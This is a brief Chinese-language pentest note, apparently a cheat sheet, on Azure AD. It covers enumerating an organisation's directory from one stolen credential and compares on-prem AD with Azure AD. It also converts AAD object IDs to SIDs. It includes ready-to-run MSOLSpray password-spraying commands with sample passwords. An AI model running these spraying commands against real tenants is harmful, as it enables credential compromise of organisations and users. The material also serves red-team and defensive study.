	对于 Microsoft，如果您将任何云服务（Office 365、Exchange Online 等）与 Active Directory（本地或在 Azure 中）一起使用，那么攻击者只需一个凭证就可以通过 Azure AD泄露您的整个 Active Directory 结构
	验证您的网络邮件门户（即https://webmail.domain.com/）
	将浏览器 URL 更改为：https ://azure.microsoft.com/
	从活动会话中选择帐户
	选择 Azure Active Directory
| Active Directory  | Azure AD  |
|---|---|
| LDAP  | REST API'S  |
| NTLM/Kerberos  | OAuth/SAML/OpenID |
| Structured directory (OU tree)  | Flat structure  |
| GPO  | No GPO's  |
| Super fine-tuned access controls  | Predefined roles |
| Domain/forest  | Tenant  |
| Trusts  | Guests  |

	密码喷射
	>git clone https://github.com/dafthack/MSOLSpray
	>Import-Module .\MSOLSpray.ps1
	>Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
	>Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme!
	将 GUID 转换为 SID
	通过连接"S-1–12–1-"到 AAD Id 的每个部分的十进制表示，将用户的 AAD id 转换为 SID。

	GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)]
	SID: S-1–12–1-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)]
	例如，表示6aa89ecb-1f8f-4d92–810d-b0dce30b6c82是S-1–12–1–1789435595–1301421967–3702525313–2188119011